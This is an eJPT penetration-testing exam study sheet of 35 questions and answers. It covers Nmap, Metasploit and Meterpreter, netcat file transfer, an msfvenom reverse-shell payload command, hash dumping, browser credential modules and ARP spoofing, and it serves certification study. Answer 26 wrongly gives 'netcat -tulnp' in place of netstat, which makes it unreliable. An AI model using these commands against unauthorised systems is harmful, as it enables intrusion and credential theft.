# Theory Questions (eJPT)

1. Which command-line tool is used to transfer files between an attacker and a target machine using a simple TCP connection?

Response: Netcat (nc). It is a versatile networking tool that can create TCP/UDP connections for file transfer, port scanning, banner grabbing, and creating reverse shells. 
For file transfer, you set up a listener on one machine (nc -l -p 4444 > file.txt) and send from the other (nc target_ip 4444 < file.txt). wget downloads from HTTP/HTTPS, scp uses SSH, and rsync synchronizes files. Exam tip: Netcat is the 'Swiss army knife' of networking — know how to use it for file transfers, reverse shells, and port listening.

2. Which Nmap output format is most useful for importing results into other tools like Metasploit?

Response: -oX (XML output)

3. During a penetration test, you discover an FTP server allowing anonymous login. What should you do first?

Response: Enumerate the accessible files and directories to look for sensitive information

4. What is the difference between active and passive reconnaissance?

Response: Active interacts directly with the target; passive gathers information without touching the target

5. Which Metasploit module type is used for scanning and enumeration without exploiting a vulnerability?

Response: Auxiliary. Auxiliary modules in Metasploit perform scanning, enumeration, fuzzing, and other tasks that do not directly exploit a vulnerability. They include port scanners, service version detectors, brute-forcers, and vulnerability checkers. 
Exploit modules deliver payloads to take advantage of vulnerabilities.
Payload modules define the code executed after exploitation.
Post modules perform post-exploitation tasks on compromised sessions.

6. Which Meterpreter post-exploitation module can extract saved passwords from web browsers on a Windows target?

Response: post/multi/gather/firefox_creds or post/windows/gather/enum_chrome

7. What is the purpose of ARP (Adress Resolution Protocol) in networking?

Response: To map IP addresses to MAC addresses on a local network

8. Which command is used in Meterpreter to download a file from the compromised target to the attacker's machine?

Response: download

9. After gaining initial access, you want to upgrade a basic reverse shell to a fully interactive TTY shell on Linux. Which Python command achieves this?

Response:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

10. You disvover a .htpasswd file through a web application vulnerability. What does this file contain?

Response: User credentials (usernames and password hashes) for HTTP basic authentication

11. What information does the 'whois' lookup provide about a target domain?

Response: Domain registration details including registrar, name servers, creation date, and sometimes contact information

12. What is the primary purpose of runnning 'enum4linux' against a target?

Response: Tu enumerate SMB/NetBIOS information including users, shares, groups, and OS info from Windows/Samba targets

13. What is the purpose of the /etc/hosts file on a Linux system?

Response: To map hostnames to IP addresses locally, bypassing DNS resolution

14. Which Metasploit module would you use to check if a Windows target is vulnerable to EternalBlue (MS17-010)?

Response: auxiliary/scanner/smb/smb_ms17_010

15. Which of the following is a common web application vulnerability where an attacker tricks a user's browser into making an unintended request?

Response: Cross-Site Request Forgery (CSRF)
It tricks a victim's browser into making an unintended request to a web application where they are authenticated. For example, if a user is logged into their bank, a CSRF attack could submit a transfer request on their befalf. The attack exploits the browser's automatic inclusion of cookies with requests.
XSS executes scripts in the browser.
SQli targets databases.
Directory traversal accesses unauthorized files.

16. What is the purpose of the 'route add' command in Metasploit after compromising a dual-homed host?

Response: To add a network route through the compromised host's session to reach other network segments

17. What is the purpose of the 'ip route' command on Linux?

Response: To display or modify the kernel routing table

18. Which technique allows an attacker to intercept communication between two hosts on the same network?

ARP spoofing (also called ARP poisoning) involves sending fake ARP responses to associate the attacker's MAC address with the IP address of another host (like the default gateway). This redirects traffic intended for that host through the attacker's machine, enabling a man-in-the-middle (MITM) attack. Tools like Ettercap and arpspoof can perform this attack. 
Port scanning discovers services.
DNS brute-forcing finds subdomains.
WHOIS is passive recon. 
Exam tip: ARP spoofing works only on the local network (same broadcast domain). Use it for credential sniffing or session hijacking.

19. Which command generates a standalone payload using msfvenom for a Linux reverse shell?

Response:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
```

The command specifices:
- `-p` (payload)
- `LHOST`
- `LPORT`
- `-f` (output format - elf for Linux executables)

20. You have compromised a Linux server and want to find all files writable by the current user. Which command would you use?

Response:
```bash
find / -writable -type f 2>/dev/null
```

21. During network reconnaissance, you need to discover all live hosts on the 10.10.10.0/24 subnet. Which Nmap option performs a host discovery scan without port scanning?

Response: `-sn`

22. After gaining a Meterpreter session on a Windows target, which command extracts password hashes from the SAM database?

Response: `hashdump`

23. After compromising a Windows system, which command displays all local user accounts?

Response: `net user`

24. What is the purpose of the Metasploit 'post/multi/recon/local_exploit_suggester' module?

Response: To analyze a compromised system and suggest local privilege escalation exploits

25. Which Nmap scan type sends SYN packets and does not complete the TCP three-way handshake?

Response: SYN scan (`-sS`). If a port responds with SYN-ACK, it is open. if RST, it is closed. This is faster and less likely to be logged than a full TCP Connect scan (-sT) which completes the handshake.

26. Which Linux command shows all active network connections and listening ports?

Response: `netcat -tulnp` or `ss -tulnp`

27. Which Meterpreter command lists all running processes on the target system?

Response: `ps`

28. After compromising a target, you find a crontab entry: '*/5 * * * * /opt/scripts/backup.sh'. What does this mean?

Response: The script runs very 5 minutes.

Minutes, hour, day of month, month, day of week.

29. What is the purpose of Meterpreter's 'migrate' command?

Response: To move the Meterpreter sesion into a different running process on the same target

30. Which OSINT tool is used to gather email addresses associated with a target domain?

Response: theHarvester

31. Which technique uses Metasploit to automatically add a route to an internal network through a compromised session?

Response: autoroute (post/multi/manage/autoroute)

32. Which command in Meterpreter is used to attempt privilege escalation to SYSTEM on a Windows target?

Response: `getsystem`

33. What is the purpose of the 'auxiliary/scanner/smb/smb_version' module in Metasploit?

Response: To enumerate the SMB version running on a target

34. Which file on a Linux system contains hashed user passwords?

Response: `/etc/shadow`

35. Which Linux file contains information about network interfaces and their IP configurations?

Response: `/etc/network/interfaces` or `/etc/netplan/*yaml`